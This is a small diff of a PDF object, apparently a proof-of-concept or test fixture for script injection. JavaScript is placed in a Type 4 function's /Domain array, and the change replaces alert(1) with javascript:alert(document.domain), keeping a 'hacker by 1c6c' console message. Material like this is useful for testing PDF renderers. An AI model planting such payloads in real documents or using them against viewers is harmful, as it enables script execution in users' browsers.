@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(console.log("hacker by 1c6c"),alert(1)) 0]
+  /Domain [(console.log("hacker by 1c6c"),javascript:alert(document.domain)) 0]
   /Range [0 0]
   /Length 12
 >>
